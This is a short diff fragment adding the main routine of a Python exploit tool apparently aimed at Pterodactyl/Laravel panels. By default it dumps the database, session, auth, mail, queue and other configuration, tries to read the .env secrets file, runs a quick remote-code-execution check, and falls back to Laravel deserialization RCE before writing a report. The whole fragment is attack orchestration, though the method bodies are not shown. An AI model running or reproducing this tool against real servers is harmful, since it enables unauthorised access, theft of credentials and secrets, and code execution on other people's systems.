+    # ── --rce-d: deserialization RCE ──
+    if args.rce_d is not None:
+        exploit.dump_app()
+        exploit.test_rce_laravel_deser(args.rce_d)
+        print()
+        return
+
+    # ── Default: full dump + all RCE methods ──
+    exploit.dump_database()
+    exploit.dump_app()
+    exploit.dump_pterodactyl()
+    exploit.dump_session()
+    exploit.dump_auth()
+    exploit.dump_services()
+    exploit.dump_mail()
+    exploit.dump_queue()
+    exploit.dump_hashing()
+    exploit.dump_cors()
+    exploit.dump_extra_files()
+    exploit.try_read_env()
+
+    rce_method = exploit.quick_rce_check()
+    if not rce_method:
+        exploit.test_rce_laravel_deser()
+
+    exploit.generate_report(args.output)
+    exploit.summary()
+    print()
+
+
+if __name__ == "__main__":
+    main()
